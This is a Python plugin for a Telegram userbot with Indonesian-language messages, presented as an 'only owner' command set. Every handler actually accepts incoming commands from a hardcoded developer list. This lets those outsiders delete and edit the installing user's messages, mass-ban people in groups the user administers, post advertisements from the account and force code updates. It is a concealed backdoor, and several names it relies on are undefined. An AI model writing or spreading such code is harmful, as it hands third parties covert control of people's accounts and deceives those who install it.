#credit by hdiiofficial


import asyncio
import random
from asyncio import sleep
from datetime import datetime
from io import BytesIO

from telethon import events
from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import Channel

import userbot.modules.sql_helper.gban_sql as gban_sql
from userbot import BOTLOG_CHATID
from userbot import CMD_HANDLER as cmd
from userbot import CMD_HELP, DEVS, bot, owner
from userbot.events import register
from userbot.utils import edit_delete, humanbytes
from userbot.utils import edit_or_reply, get_user_from_event, man_cmd
from userbot.modules.ping import absen
from telethon.events import ChatAction


from .admin import BANNED_RIGHTS, UNBAN_RIGHTS


@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurgeme")
async def ownpurgeme(delme):
    message = delme.text
    count = int(message[9:])
    i = 1
    async for message in delme.client.iter_messages(delme.chat_id, from_user="me"):
        if i > count + 1:
            break
        i += 1
        await message.delete()
    smsg = await delme.client.send_message(
        delme.chat_id,
        "**Berhasil Menghapus** " + str(count) + " **Kenangan**",
    )
    await sleep(2)
    i = 1
    await smsg.delete()


@register(incoming=True, from_users=DEVS, pattern=r"^\.cpurge$")
async def ownfastpurger(purg):
    chat = await purg.get_input_chat()
    msgs = []
    itermsg = purg.client.iter_messages(chat, min_id=purg.reply_to_msg_id)
    count = 0
    if purg.reply_to_msg_id is None:
        return await edit_delete(purg, "**Mohon Balas Ke Pesan**")
    async for msg in itermsg:
        msgs.append(msg)
        count += 1
        msgs.append(purg.reply_to_msg_id)
        if len(msgs) == 100:
            await purg.client.delete_messages(chat, msgs)
            msgs = []
    if msgs:
        await purg.client.delete_messages(chat, msgs)
    done = await purg.client.send_message(
        purg.chat_id,
        "**Fast Purge Completed!**\n**Berhasil Menghapus** `"
        + str(count)
        + "` **Pesan**",
    )
    await sleep(2)
    await done.delete()

@register(incoming=True, from_users=DEVS, pattern=r"^\.cedit")
async def ownediter(edit):
    message = edit.text
    chat = await edit.get_input_chat()
    self_id = await edit.client.get_peer_id("me")
    string = str(message[6:])
    i = 1
    async for message in edit.client.iter_messages(chat, self_id):
        if i == 2:
            await message.edit(string)
            await edit.delete()
            break
        i += 1

@register(incoming=True, from_users=DEVS, pattern=r"^\.cdel$")
async def owndelete_it(delme):
    msg_src = await delme.get_reply_message()
    if delme.reply_to_msg_id:
        try:
            await msg_src.delete()
            await delme.delete()
        except rpcbaseerrors.BadRequestError:
            await delme.edit("**Tidak Bisa Menghapus Pesan**")

@register(incoming=True, from_users=DEVS, pattern=r"^\.cgbann(?: |$)(.*)")
async def owngban(event):
    if event.fwd_from:
        return
    gbun = await edit_or_reply(event, "`MengGbanned...`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, gbun)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await gbun.edit("**Ngapain NgeGban diri sendiri Goblok 🐽**")
        return
    if user.id in DEVS:
        await gbun.edit("**Gagal GBAN karena dia adalah Pembuat saya 🗿**")
        return
    if gban_sql.is_gbanned(user.id):
        await gbun.edit(
            f"**Si** [Jamet](tg://user?id={user.id}) **ini sudah ada di daftar gbanned**"
        )
    else:
        gban_sql.freakgban(user.id, reason)
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await gbun.edit("**Anda Tidak mempunyai GC yang anda admin 🥺**")
        return
    await gbun.edit(
        f"**initiating gban of the** [Jamet](tg://user?id={user.id}) **in** `{len(san)}` **groups**"
    )
    for i in range(fiz):
        try:
            await event.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"**Anda tidak memiliki izin Banned di :**\n**Group Chat :** `{event.chat_id}`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await gbun.edit(
            f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Reason :** `{reason}`"
        )
    else:
        await gbun.edit(
            f"**GBanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Added to gbanlist.**"
        )

@register(incoming=True, from_users=DEVS, pattern=r"^\.cungbann(?: |$)(.*)")
async def ownungban(event):
    if event.fwd_from:
        return
    ungbun = await edit_or_reply(event, "`UnGbanning...`")
    start = datetime.now()
    user, reason = await get_user_from_event(event, ungbun)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.freakungban(user.id)
    else:
        await ungbun.edit(
            f"**Si** [Jamet](tg://user?id={user.id}) **ini tidak ada dalam daftar gban Anda**"
        )
        return
    san = []
    san = await admin_groups(event)
    count = 0
    fiz = len(san)
    if fiz == 0:
        await ungbun.edit("**Anda Tidak mempunyai GC yang anda admin 🥺**")
        return
    await ungbun.edit(
        f"**initiating ungban of the** [Jamet](tg://user?id={user.id}) **in** `{len(san)}` **groups**"
    )
    for i in range(fiz):
        try:
            await event.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                f"**Anda tidak memiliki izin Banned di :**\n**Group Chat :** `{event.chat_id}`",
            )
    end = datetime.now()
    timetaken = (end - start).seconds
    if reason:
        await ungbun.edit(
            f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}`) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Reason :** `{reason}`"
        )
    else:
        await ungbun.edit(
            f"**Ungbanned** [{user.first_name}](tg://user?id={user.id}) **in** `{count}` **groups in** `{timetaken}` **seconds**!!\n**Removed from gbanlist**"
        )

@register(incoming=True, from_users=DEVS, pattern=r"^.absen$")
async def jsubot(ganteng):
    await ganteng.reply(random.choice(absen))

@register(incoming=True, from_users=DEVS, pattern=r"^.promosi$")
async def risman(ganteng):
    await ganteng.reply("Mau Pasang Userbot?Males Ribet?Mau yang terima jadi?Sini aja Kak di @Jowo_Store cepat dan amanah😊")

@register(incoming=True, from_users=DEVS, pattern="update( now| deploy|$)")
async def cupdate(event):
    "For .update command, check if the bot is up to date, update if specified"
    xx = await edit_or_reply(event, "`Mengecek Pembaruan, Tunggu Sebentar...`")
    conf = event.pattern_match.group(1).strip()
    off_repo = UPSTREAM_REPO_URL
    force_update = False
    try:
        txt = "**Pembaruan Tidak Dapat Di Lanjutkan Karna "
        txt += "Terjadi Beberapa ERROR**\n\n**LOGTRACE:**\n"
        repo = Repo()
    except NoSuchPathError as error:
        await xx.edit(f"{txt}\n**Directory** `{error}` **Tidak Dapat Di Temukan.**")
        return repo.__del__()
    except GitCommandError as error:
        await xx.edit(f"{txt}\n**Kegagalan awal!** `{error}`")
        return repo.__del__()
    except InvalidGitRepositoryError as error:
        if conf is None:
            return await xx.edit(
                f"**Sayangnya, Directory {error} Tampaknya Bukan Dari Repo."
                "\nTapi Kita Bisa Memperbarui Paksa Userbot Menggunakan** `.update deploy`"
            )
        repo = Repo.init()
        origin = repo.create_remote("upstream", off_repo)
        origin.fetch()
        force_update = True
        repo.create_head("master", origin.refs.master)
        repo.heads.master.set_tracking_branch(origin.refs.master)
        repo.heads.master.checkout(True)

    ac_br = repo.active_branch.name
    try:
        repo.create_remote("upstream", off_repo)
    except BaseException:
        pass

    ups_rem = repo.remote("upstream")
    ups_rem.fetch(ac_br)

    changelog = await gen_chlog(repo, f"HEAD..upstream/{ac_br}")
    if conf == "deploy":
        await xx.edit("`[HEROKU]: Update Deploy Js-Userbot Sedang Dalam Proses...`")
        await deploy(xx, repo, ups_rem, ac_br, txt)
        return

    if changelog == "" and not force_update:
        await edit_delete(xx, "**✥ Js-Userbot Sudah Versi Terbaru**")
        return repo.__del__()

    if conf == "" and not force_update:
        await print_changelogs(xx, ac_br, changelog)
        await xx.delete()
        return await event.respond(
            "**Ketik** `.update deploy` **untuk Mengupdate Userbot.**"
        )

    if force_update:
        await xx.edit("**Sinkronisasi Paksa Ke Kode Userbot Terbaru, Harap Tunggu...**")

    if conf == "now":
        for commit in changelog.splitlines():
            if (
                commit.startswith("- [NQ]")
                and HEROKU_APP_NAME is not None
                and HEROKU_API_KEY is not None
            ):
                return await xx.edit(
                    "**Quick update telah dinonaktifkan untuk pembaruan ini; "
                    "Gunakan** `.update deploy` **sebagai gantinya.**"
                )
        await xx.edit("**Perfoming a quick update, please wait...**")
        await update(xx, repo, ups_rem, ac_br)

    return


CMD_HELP.update(
    {
        "owner": f"**plugin :**`only owner`\
        \n\n• Syntax :**`{cmd}cgban <username/userid>`\
        \n\n• Syntax :**`{cmd}cungban <username/userid>`\
        \n\n  Syntax :**`{cmd}cpurgeme <jumlah>`\
        \n\n  Syntax :**`{cmd}cpurge <reply teks>`\
        \n\n  Syntax :**`{cmd}cedit <reply teks>`\
        \n\n  Syntax :**`{cmd}cdel <reply teks>`\
        \n\n  Syntax :**`{cmd}promosi`\
        \n\n  Syntax :**`{cmd}absen`\
        \n\n  Syntax :**`{cmd}cupdate`\
    "
    }
)
